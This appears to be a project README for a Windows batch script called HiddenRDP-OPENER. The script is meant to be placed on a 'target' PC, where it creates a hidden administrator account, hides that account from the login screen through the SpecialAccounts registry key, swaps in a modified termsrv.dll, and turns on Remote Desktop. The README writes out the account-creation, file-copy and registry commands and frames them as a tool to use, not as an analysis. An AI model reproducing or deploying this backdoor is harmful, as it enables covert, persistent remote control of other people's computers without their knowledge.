# HiddenRDP-OPENER
This script make any windows compatible with RDP connection 

<h2>Requirements :</h2>
Windows 7 , Windows 8 , Windows 10 / Not tested yet in Windows XP

<h2>How it works ?:</h2>
This script create a hidden profil ( Administrator privilege ) and change registry parametre to make windows compatible with RDP Connection.

<h2>Configuration:</h2>

You need to open RDPScript.bat with your editor (in your pc)<br />
And make this changes :<br />
<h4>net user hidden 123123 /ADD </h4>
hidden = name of your created account<br />
123123 = password of your account <br />
<h4>xcopy "termsrv.dll" "%windir%\System32\" /s /h /q </h4>
change termsrv.dll with your full path (in pc target) , ex : C:\Users\comix\Downloads\termsrv.dll <br />
move termsrv.dll,RDPScript.bat in the pc target 

<h2>Delete configuration</h2>
Change this value in RDPScript.bat to delete the hidden profile from
<h4>REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hidden /t REG_DWORD /d 0X00000000 /f</h4>
To 
<h4>REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Hidden /t REG_DWORD /d 0X00000001 /f</h4>
then you will be able to see your hidden profil
And change this line 
<h4>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000000 /f </h4>
to
<h4>
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0X00000001 /f
<h4>
<h2>License</h2>

Copyright © 2019 Soufiyan Ak (Comix)
